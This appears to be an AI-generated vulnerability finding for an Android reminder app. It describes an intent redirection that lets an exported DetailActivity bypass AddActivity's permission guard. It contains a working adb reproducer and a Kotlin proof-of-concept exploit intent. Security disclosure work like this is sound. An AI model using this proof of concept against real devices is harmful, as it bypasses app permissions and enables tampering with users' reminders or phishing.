title: DetailActivity Permission-Bypass via Intent Redirection to AddActivity

evidence.manifest_excerpt:
<activity
    android:name="com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="uuid" android:host="reminder.uuid"/>
  </intent-filter>
  <intent-filter>
    <action android:name="com.samsung.android.app.reminder.action.ReminderDetailView"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="reminder" android:host="viewdetail"/>
  </intent-filter>
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="content" android:host="@string/string_detail_view_host_name"/>
  </intent-filter>
</activity>

<activity
    android:name="com.samsung.android.app.reminder.ui.detail.add.AddActivity"
    android:permission="com.samsung.android.app.reminder.permission.action.REGISTER"
    android:exported="true"/>
evidence.intent_reproducer:
adb shell am start -W -a android.intent.action.VIEW \
  -d 'uuid://reminder.uuid/11111111-2222-3333-4444-555555555555' \
  -n com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity \
  --ei add_view_type 2 \
  --es uuid 11111111-2222-3333-4444-555555555555
evidence.poc_kotlin:
val victimUuid = "11111111-2222-3333-4444-555555555555"
val exploit = Intent(Intent.ACTION_VIEW).apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    )
    data = Uri.parse("uuid://reminder.uuid/$victimUuid")
    putExtra("uuid", victimUuid)
    putExtra("add_view_type", 2)
    putExtra("viewDetailFromCalendar", true)
    addFlags(
        Intent.FLAG_ACTIVITY_NEW_TASK or
        Intent.FLAG_GRANT_READ_URI_PERMISSION or
        Intent.FLAG_GRANT_WRITE_URI_PERMISSION
    )
}
startActivity(exploit)

ai_rationale: DetailActivity는 android:exported=true이고 permission 미지정 상태로 세 종류의 deeplink intent-filter (uuid://, reminder://viewdetail, content://...)에 노출됨. onCreate에서 getIntent()를 그대로 보존한 채 setClass(ctx, AddActivity.class)로 컴포넌트만 갈아끼우고 startActivity를 호출하기 때문에 AddActivity의 android:permission="...REGISTER" 가드가 우회됨 (classic confused-deputy / permission re-delegation). 공격자 제어 extras (add_view_type, uuid, viewDetailFromCalendar, FLAG_GRANT_READ/WRITE_URI_PERMISSION, ClipData)가 모두 보존되어 다운스트림 sink (V-006 scan-reminder, V-009 pending_data parseUri, V-010 Serializable, V-011 self-embed)로 흘러들어감. 권한 없는 3rd-party 앱이 임의 reminder를 EDIT 모드로 띄우거나 phishing reminder를 생성 가능.
